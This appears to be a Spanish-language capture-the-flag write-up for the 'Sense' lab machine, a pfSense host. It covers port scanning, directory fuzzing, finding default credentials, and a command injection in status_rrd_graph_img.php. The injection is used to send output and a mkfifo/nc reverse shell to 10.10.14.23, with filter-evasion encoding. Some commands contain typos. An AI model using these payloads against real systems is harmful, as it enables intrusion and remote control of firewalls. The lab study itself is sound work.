# Sense

IP: 10.10.10.60

# Ping y whichSyhstem.py

`ping -c 1 10.10.10.60`

`whichSystem.py 10.10.10.60`

## Scanning

`nmap -p- --open -T5 -v -n 10.10.10.60 -oN allPorts` --> muy lento

`nmap -sS --min-rate 5000 -Pn -vvv -n 10.10.10.60 -p- -oN allPorts`

`nmap -sC -sV -p80,443 10.10.10.60 -oN targetedPorts`

`nmap -p80,443 --script http-enum 10.10.10.60 -oN webScan`

## Vamos a la web

- Vemos que es un PfSense --> panel de login
- Buscamos credenciales por defecto de pfsense
- CTRL+U
- Wappalyzer
- `whatweb http://10.10.10.60`
- `wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.60/FUZZ`
- Añadimos -L para los redirect

`cd content`

`nano extensions.txt`
~~~
php
html
txt
~~~

`wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt https://10.10.10.60/FUZZ.FUZ2Z`

`cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -E -i 'user|pass|cred|key' > routes.txt`

`wfuzz -c --hc=404 -w routes.txt -w extensions.txt https://10.10.10.60/FUZZ.FUZ2Z`

Encontramos system-users.txt --> user: Rohit pass: company default

## Dentro Pfsense
~~~
searchsploit pfsense 2.1.3
searchsploit pfsense 2.X
searchsploit pfsense 2
~~~
- Encontramos exploit graph_img
- 10.10.10.60/status_rrd_graph_img.php?database=queues;sleep 10

- `nc -nlvp 4646`
- 10.10.10.60/status_rrd_graph_img.php?database=queues;whoami | nc 10.10.14.23 4646

## Burpsite

- Target --> scope --> add
- Proxy --> options --> only this target
- `nc -nlvp 4646`
- `man ascii`
- "-" --> no le gusta asi que usamos '\055'
- guion=$(print+'\055');echo+$guion|nc+10.10.14.23+4646
- "&" --> '\046'
- echo "rm /rmp/f;mkfifo /tmp/f;cat /tmp/f\bin/sh -i 2>&1|nc 10.10.14.23 4646 >/tmp/f" | tr ' ' '+' | sed 's/\//${HOME}/g'
- echo "rm /rmp/f;mkfifo /tmp/f;cat /tmp/f\bin/sh -i 2>&1|nc 10.10.14.23 4646 >/tmp/f" | tr ' ' '+' | sed 's/\//${HOME}/g' \ sed 's/-/${guion}/g' | sed 's/&/${amperson}/g' 

`find . -name user.txt && find . -name root.txt`




